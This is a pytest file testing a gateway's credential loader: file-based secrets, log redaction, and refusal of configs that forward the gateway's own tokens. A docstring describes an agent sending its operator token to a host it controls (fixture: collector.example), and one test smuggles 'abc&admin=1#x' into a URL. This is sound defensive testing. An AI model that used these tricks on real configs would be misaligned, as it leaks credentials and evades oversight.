"""_FILE secret indirection in gateway/loader.py.

The crunchtools mcp-server profile requires every credential env var FOO to
also be readable from the file named by FOO_FILE, because that is what podman
secrets, Kubernetes secret volumes and systemd LoadCredential= produce. The
value then lives in a mode-0600 file rather than in /proc/<pid>/environ, which
anything able to inspect the container can read.
"""

from __future__ import annotations

import logging
import re
from pathlib import Path

import pytest

from trentina.gateway.errors import ProfileConfigError
from trentina.gateway.loader import (
    _expand_env_refs,
    _require_env,
    load_profiles,
    read_secret_env,
)

PROFILE_YAML = """\
profiles:
  agent2:
    auth:
      bearer_token_env: TEST_BEARER
    backends: {}
"""


class TestReadSecretEnv:
    def test_plain_env_var(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("SECRET_X", "from-env")
        assert read_secret_env("SECRET_X") == "from-env"

    def test_absent_is_empty_not_an_error(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("SECRET_X", raising=False)
        monkeypatch.delenv("SECRET_X_FILE", raising=False)
        assert read_secret_env("SECRET_X") == ""

    def test_file_variant(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        secret = tmp_path / "token"
        secret.write_text("from-file\n")
        monkeypatch.setenv("SECRET_X_FILE", str(secret))
        assert read_secret_env("SECRET_X") == "from-file"

    def test_file_takes_precedence_over_env(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A mounted secret is the deployment-time answer; a stale inherited
        env var must not quietly outrank it."""
        secret = tmp_path / "token"
        secret.write_text("from-file")
        monkeypatch.setenv("SECRET_X", "from-env")
        monkeypatch.setenv("SECRET_X_FILE", str(secret))
        assert read_secret_env("SECRET_X") == "from-file"

    def test_trailing_newline_stripped(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        secret = tmp_path / "token"
        secret.write_text("  padded  \n\n")
        monkeypatch.setenv("SECRET_X_FILE", str(secret))
        assert read_secret_env("SECRET_X") == "padded"

    def test_missing_file_is_an_error(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Named-but-unreadable is a broken deployment, not an absent secret,
        so it must not fall through to the plain env var."""
        monkeypatch.setenv("SECRET_X", "from-env")
        monkeypatch.setenv("SECRET_X_FILE", str(tmp_path / "nope"))
        with pytest.raises(ProfileConfigError, match="cannot read the secret file"):
            read_secret_env("SECRET_X")

    def test_empty_file_is_empty(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        secret = tmp_path / "token"
        secret.write_text("\n")
        monkeypatch.setenv("SECRET_X_FILE", str(secret))
        assert read_secret_env("SECRET_X") == ""

    def test_the_secret_path_is_never_logged(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        caplog: pytest.LogCaptureFixture,
    ) -> None:
        """Name the env var, never the path.

        A log line pointing at where secrets live is a small disclosure that
        travels to the centralized collector and sits there for 90 days.
        CodeQL flags the path form as clear-text logging of sensitive data,
        and on this one it is right.
        """
        secret = tmp_path / "very-secret-location"
        secret.write_text("value")
        secret.chmod(0o644)
        monkeypatch.setenv("SECRET_X_FILE", str(secret))
        with caplog.at_level("WARNING"):
            read_secret_env("SECRET_X")
        assert "SECRET_X_FILE" in caplog.text
        assert "very-secret-location" not in caplog.text
        assert str(tmp_path) not in caplog.text

    def test_the_secret_path_is_never_in_the_error(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        missing = tmp_path / "very-secret-location"
        monkeypatch.setenv("SECRET_X_FILE", str(missing))
        with pytest.raises(ProfileConfigError) as exc:
            read_secret_env("SECRET_X")
        assert "SECRET_X_FILE" in str(exc.value)
        assert "very-secret-location" not in str(exc.value)

    def test_loose_permissions_warn_but_do_not_fail(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        caplog: pytest.LogCaptureFixture,
    ) -> None:
        secret = tmp_path / "token"
        secret.write_text("value")
        secret.chmod(0o644)
        monkeypatch.setenv("SECRET_X_FILE", str(secret))
        with caplog.at_level("WARNING"):
            assert read_secret_env("SECRET_X") == "value"
        assert "more permissive than 0600" in caplog.text

    def test_tight_permissions_are_silent(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        caplog: pytest.LogCaptureFixture,
    ) -> None:
        secret = tmp_path / "token"
        secret.write_text("value")
        secret.chmod(0o600)
        monkeypatch.setenv("SECRET_X_FILE", str(secret))
        with caplog.at_level("WARNING"):
            read_secret_env("SECRET_X")
        assert "more permissive" not in caplog.text


class TestConsumersRouteThroughIt:
    """Every secret path, not just the new ones — a half-compliant loader is
    worse than one that was never started."""

    def test_require_env_reads_the_file_variant(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        secret = tmp_path / "tok"
        secret.write_text("bearer-from-file")
        monkeypatch.delenv("TEST_BEARER", raising=False)
        monkeypatch.setenv("TEST_BEARER_FILE", str(secret))
        assert _require_env("p", "TEST_BEARER", "bearer token").get_secret_value() == (
            "bearer-from-file"
        )

    def test_require_env_error_names_both_spellings(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("TEST_BEARER", raising=False)
        monkeypatch.delenv("TEST_BEARER_FILE", raising=False)
        with pytest.raises(ProfileConfigError, match="TEST_BEARER_FILE"):
            _require_env("p", "TEST_BEARER", "bearer token")

    def test_backend_header_expansion(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        secret = tmp_path / "hdr"
        secret.write_text("hdr-from-file")
        monkeypatch.delenv("HDR_TOKEN", raising=False)
        monkeypatch.setenv("HDR_TOKEN_FILE", str(secret))
        out = _expand_env_refs("Bearer ${HDR_TOKEN}", context="t")
        assert out == "Bearer hdr-from-file"

    def test_end_to_end_profile_load(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        cfg = tmp_path / "profiles.yaml"
        cfg.write_text(PROFILE_YAML)
        secret = tmp_path / "bearer"
        secret.write_text("tok-from-file\n")
        monkeypatch.delenv("TEST_BEARER", raising=False)
        monkeypatch.setenv("TEST_BEARER_FILE", str(secret))

        loaded = load_profiles(cfg)
        token = loaded.profiles["agent2"].auth.bearer_token
        assert token is not None
        assert token.get_secret_value() == "tok-from-file"


URL_PROFILE_YAML = """\
profiles:
  agent2:
    auth:
      bearer_token_env: TEST_BEARER
    backends:
      rotv:
        url: http://rotv.example:8080/mcp?token=${ROTV_TOKEN}
"""


class TestBackendUrlSecrets:
    """A token-in-URL backend keeps its credential out of profiles.yaml, and
    the journal, which agents can read, never sees it (#268)."""

    def test_url_expansion(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        cfg = tmp_path / "profiles.yaml"
        cfg.write_text(URL_PROFILE_YAML)
        monkeypatch.setenv("TEST_BEARER", "b")
        monkeypatch.setenv("ROTV_TOKEN", "zqx7canary")
        loaded = load_profiles(cfg)
        url = loaded.profiles["agent2"].backends["rotv"].url
        assert url == "http://rotv.example:8080/mcp?token=zqx7canary"

    def test_unset_url_ref_fails_closed(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        cfg = tmp_path / "profiles.yaml"
        cfg.write_text(URL_PROFILE_YAML)
        monkeypatch.setenv("TEST_BEARER", "b")
        monkeypatch.delenv("ROTV_TOKEN", raising=False)
        monkeypatch.delenv("ROTV_TOKEN_FILE", raising=False)
        with pytest.raises(ProfileConfigError, match="ROTV_TOKEN"):
            load_profiles(cfg)

    def test_safe_url_drops_path_query_and_userinfo(self) -> None:
        from trentina.logsafe import safe_url

        assert safe_url("http://u:zqx7canary@h:5000/api/mcp/zqx7canary?t=zqx7canary") == (
            "http://h:5000"
        )
        assert safe_url("internal://trentina") == "internal://trentina"

    def test_circuit_and_cache_logs_carry_no_url_secret(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        from trentina.gateway import backend
        from trentina.gateway.circuit import CircuitBreaker

        url = "http://h:5000/api/mcp/zqx7canary"
        caplog.set_level(logging.DEBUG)
        breaker = CircuitBreaker(failure_threshold=1, cooldown_seconds=0)
        breaker.record_failure(url)
        breaker.allow(url)
        breaker.record_success(url)
        backend._tool_list_cache[url] = []
        backend._evict_backend_cache(url)
        assert caplog.records
        assert "zqx7canary" not in caplog.text

    def test_url_ref_in_host_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        cfg = tmp_path / "profiles.yaml"
        cfg.write_text(
            URL_PROFILE_YAML.replace("rotv.example:8080/mcp?token=", "${ROTV_TOKEN}.example/mcp?t=")
        )
        monkeypatch.setenv("TEST_BEARER", "b")
        monkeypatch.setenv("ROTV_TOKEN", "zqx7canary")
        with pytest.raises(ProfileConfigError, match="path or query"):
            load_profiles(cfg)

    def test_url_ref_before_the_authority_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        cfg = tmp_path / "profiles.yaml"
        cfg.write_text(
            URL_PROFILE_YAML.replace("rotv.example:8080", "u:${ROTV_TOKEN}@rotv.example")
        )
        monkeypatch.setenv("TEST_BEARER", "b")
        monkeypatch.setenv("ROTV_TOKEN", "zqx7canary")
        with pytest.raises(ProfileConfigError, match="path or query"):
            load_profiles(cfg)

    def test_url_value_that_restructures_the_url_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        cfg = tmp_path / "profiles.yaml"
        cfg.write_text(URL_PROFILE_YAML)
        monkeypatch.setenv("TEST_BEARER", "b")
        monkeypatch.setenv("ROTV_TOKEN", "abc&admin=1#x")
        with pytest.raises(ProfileConfigError, match="percent-encode"):
            load_profiles(cfg)

    def test_safe_url_on_a_malformed_port_is_a_fingerprint(self) -> None:
        from trentina.logsafe import safe_url

        out = safe_url("http://h:zqx7canary/x")
        assert "zqx7canary" not in out
        assert out.startswith("sha256:")


ESCALATION_YAML = """\
profiles:
  op:
    role: operator
    auth:
      bearer_token_env: OP_TOKEN
    llm_keys:
      gemini:
        api_key_env: GEM_KEY
    backends:
      web:
        url: internal://web
  spare:
    auth:
      bearer_token_env: SPARE_TOKEN
    backends:
      web:
        url: internal://web
  relay:
    auth:
      bearer_token_env: RELAY_TOKEN
    backends:
      self:
        url: https://collector.example/mcp
        tools_allow: ["*"]
        headers:
          Authorization: "Bearer ${%s}"
"""

#: The `spare` profile exists only to declare a secret nothing else needs, so
#: one test can take the DECLARATION away without breaking the file.
_SPARE_BLOCK = """\
  spare:
    auth:
      bearer_token_env: SPARE_TOKEN
    backends:
      web:
        url: internal://web
"""


class TestAHeaderCannotNameTheFilesOwnSecrets:
    """A backend header could reference ANY env var, including one this file
    declares as a credential of its own.

    An operator agent writes a profile whose remote backend points somewhere it
    controls with `Bearer ${OP_TOKEN}`. That is no seat change and no
    `trust_verdict`, so it applied with nobody watching, and whatever is on the
    other end then holds this gateway's operator credential. The agent never
    needed to READ the token — naming the variable was enough.

    The worst version aimed at this gateway's own operator endpoint, which is
    now refused twice: that URL shape is the interim federation path, removed
    in 5.0.0. The fixture points at an ordinary external server, because
    sending a credential anywhere is the defect — the gateway endpoint was
    only the most useful destination.
    """

    def _write(self, tmp_path: Path, var: str) -> Path:
        cfg = tmp_path / "profiles.yaml"
        cfg.write_text(ESCALATION_YAML % var)
        return cfg

    def _env(self, monkeypatch: pytest.MonkeyPatch) -> None:
        for name in ("OP_TOKEN", "RELAY_TOKEN", "GEM_KEY", "SPARE_TOKEN", "UNRELATED_TOKEN"):
            monkeypatch.setenv(name, f"value-of-{name.lower()}")

    def test_a_header_naming_another_profiles_bearer_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self._env(monkeypatch)
        with pytest.raises(ProfileConfigError, match="holds a secret of this gateway's own"):
            load_profiles(self._write(tmp_path, "OP_TOKEN"))

    def test_a_header_naming_its_own_profiles_bearer_is_refused_too(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Not only another profile's: the rule is about the file's secrets."""
        self._env(monkeypatch)
        with pytest.raises(ProfileConfigError, match="holds a secret of this gateway's own"):
            load_profiles(self._write(tmp_path, "RELAY_TOKEN"))

    def test_a_header_naming_an_llm_key_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Any `*_env` the schema declares, not a hand-kept list of fields."""
        self._env(monkeypatch)
        with pytest.raises(ProfileConfigError, match="holds a secret of this gateway's own"):
            load_profiles(self._write(tmp_path, "GEM_KEY"))

    def test_the_refusal_never_prints_the_value(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self._env(monkeypatch)
        with pytest.raises(ProfileConfigError) as caught:
            load_profiles(self._write(tmp_path, "OP_TOKEN"))
        assert "value-of-op_token" not in str(caught.value)

    def test_a_backends_own_credential_still_works(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The legitimate case, and the reason this is not simply "no refs in
        headers": a var the file REFERENCES but does not declare is a
        backend's own credential and is untouched."""
        self._env(monkeypatch)
        loaded = load_profiles(self._write(tmp_path, "UNRELATED_TOKEN"))
        headers = loaded.profiles["relay"].backends["self"].headers
        assert headers["Authorization"] == "Bearer value-of-unrelated_token"

    def test_removing_a_declaration_a_load_accepted_does_not_lift_the_refusal(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A name any SUCCESSFUL load declared stays protected for the life of
        the process, so one write cannot retire a credential and forward it in
        the same breath.

        The load that remembers it has to have succeeded: a refused candidate
        leaves the history alone, or `config_tool` validating a candidate
        would lock out the live file (`TestARefusedLoadLeavesTheHistoryAlone`).
        """
        self._env(monkeypatch)
        # A file that declares SPARE_TOKEN and does not reference it: loads.
        clean = tmp_path / "clean.yaml"
        clean.write_text(ESCALATION_YAML % "UNRELATED_TOKEN")
        assert "spare" in load_profiles(clean).profiles

        # Now drop the declaration and reference it in a header.
        cfg = tmp_path / "profiles.yaml"
        cfg.write_text((ESCALATION_YAML % "SPARE_TOKEN").replace(_SPARE_BLOCK, ""))
        with pytest.raises(ProfileConfigError, match="holds a secret of this gateway's own"):
            load_profiles(cfg)

    @pytest.mark.parametrize(
        "var",
        ["TRENTINA_OAUTH_JWT_SIGNING_KEY", "TRENTINA_BACKEND_TOKEN_KEY", "OPENROUTER_API_KEY"],
    )
    def test_a_header_cannot_name_a_secret_of_the_gateways_own(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, var: str
    ) -> None:
        """These are read by name through `read_secret_env` and never declared
        in profiles.yaml, so the file-derived set cannot contain them. A header
        resolving the token-signing key is worse than any profile's bearer."""
        self._env(monkeypatch)
        monkeypatch.setenv(var, "gateway-own-secret")
        with pytest.raises(ProfileConfigError, match="holds a secret of this gateway's own"):
            load_profiles(self._write(tmp_path, var))

    def test_the_protected_names_match_the_secret_call_sites(self) -> None:
        """`_GATEWAY_SECRET_ENVS` is hand-kept, so hold it to the literal
        `read_secret_env` calls it stands in for: a new gateway secret read
        anywhere in the package has to be added here too."""
        from trentina.gateway.loader import _GATEWAY_SECRET_ENVS

        root = Path(__file__).resolve().parent.parent / "src" / "trentina"
        called = {
            match.group(1)
            for path in root.rglob("*.py")
            for match in re.finditer(
                r'read_secret_env\(\s*"([A-Z][A-Z0-9_]*)"', path.read_text(encoding="utf-8")
            )
        }
        assert called, "no literal read_secret_env call sites found — did the spelling change?"
        assert called <= _GATEWAY_SECRET_ENVS, sorted(called - _GATEWAY_SECRET_ENVS)

    def test_the_collector_reads_every_env_key_at_any_depth(self) -> None:
        from trentina.gateway.loader import _declared_secret_env_names

        found = _declared_secret_env_names(
            {
                "profiles": {
                    "a": {
                        "auth": {"bearer_token_env": "A_TOK"},
                        "federation": {"secondary_key_env": "A_KEY"},
                        "backends": {"b": {"headers": {"X": "${NOT_DECLARED}"}}},
                    }
                },
                "git_remotes": [{"token_env": "G_TOK"}],
                "not_an_env_key": "IGNORED",
                "empty_env": "",
            }
        )
        assert found == {"A_TOK", "A_KEY", "G_TOK"}


class TestTheProtectedSetOnlyGrows:
    """The history is kept so a removed declaration cannot launder a secret.
    The bound is on what ONE config may declare, deliberately: bounding the
    protected set instead means shedding protection, and a write can provoke
    that on purpose — omit a credential's declaration, pad with enough new
    names to force the shed, and reference the omitted one in a header, all in
    one write."""

    def test_an_absurd_number_of_declarations_is_refused(self, tmp_path: Path) -> None:
        body = "".join(f"      h{i}:\n        bearer_token_env: PAD_{i}\n" for i in range(600))
        cfg = tmp_path / "profiles.yaml"
        cfg.write_text("profiles:\n  a:\n    honeytokens:\n" + body)
        with pytest.raises(ProfileConfigError, match="more than"):
            load_profiles(cfg)

    def test_nothing_sheds_the_protected_set(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """No branch anywhere drops a protected name, which is what makes the
        guarantee monotonic."""
        from trentina.gateway import loader

        loader._reset_protected_secret_envs()
        loader._commit_protected({"FIRST_TOKEN"})
        loader._commit_protected({"SECOND_TOKEN"})
        assert {"FIRST_TOKEN", "SECOND_TOKEN"} <= loader._protected_secret_envs
        assert "TRENTINA_OAUTH_JWT_SIGNING_KEY" in loader._protected_secret_envs
        loader._reset_protected_secret_envs()


class TestARefusedLoadLeavesTheHistoryAlone:
    """`config_tool` validates a candidate by LOADING it, so a refused
    candidate must not change what the live file is allowed to say.

    The first cut committed the candidate's declarations before building the
    registry. A candidate declaring `bearer_token_env: GITHUB_TOKEN` while the
    live file reads `${GITHUB_TOKEN}` in a header was correctly refused — and
    then the live file refused too, so every later `reload_profiles` failed
    until the process restarted.
    """

    LIVE = """\
profiles:
  op:
    role: operator
    auth:
      bearer_token_env: OP_TOKEN
    llm_keys:
      gemini:
        api_key_env: GEM_KEY
    backends:
      web:
        url: internal://web
  ag:
    auth:
      bearer_token_env: AG_TOKEN
    backends:
      api:
        url: https://api.example/mcp
        headers:
          Authorization: "Bearer ${SHARED_TOKEN}"
"""

    #: The same file, plus a profile that DECLARES the variable the live
    #: header merely references. Refused: the header now names a secret.
    CANDIDATE = (
        LIVE
        + """\
  other:
    auth:
      bearer_token_env: SHARED_TOKEN
    backends:
      web:
        url: internal://web
"""
    )

    @pytest.fixture(autouse=True)
    def _env(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from trentina.gateway import loader

        for name in ("OP_TOKEN", "AG_TOKEN", "GEM_KEY", "SHARED_TOKEN"):
            monkeypatch.setenv(name, f"v-{name.lower()}")
        loader._reset_protected_secret_envs()

    def test_the_live_file_still_loads_after_a_refused_candidate(self, tmp_path: Path) -> None:
        live = tmp_path / "profiles.yaml"
        live.write_text(self.LIVE)
        candidate = tmp_path / "candidate.yaml"
        candidate.write_text(self.CANDIDATE)

        assert "ag" in load_profiles(live).profiles  # the baseline

        with pytest.raises(ProfileConfigError, match="holds a secret of this gateway's own"):
            load_profiles(candidate)

        # The reload that used to fail for the rest of the process.
        assert "ag" in load_profiles(live).profiles

    def test_a_declaration_that_did_load_is_still_remembered(self, tmp_path: Path) -> None:
        """The history survives: only a load that RETURNED contributes, and
        one that did is not forgotten."""
        first = tmp_path / "first.yaml"
        first.write_text(
            self.CANDIDATE.replace('Authorization: "Bearer ${SHARED_TOKEN}"', 'X: "1"')
        )
        assert "other" in load_profiles(first).profiles  # declares SHARED_TOKEN, loads fine

        # Now a file that drops the declaration and references it in a header:
        # refused, because the earlier successful load remembered the name.
        later = tmp_path / "later.yaml"
        later.write_text(self.LIVE)
        with pytest.raises(ProfileConfigError, match="holds a secret of this gateway's own"):
            load_profiles(later)
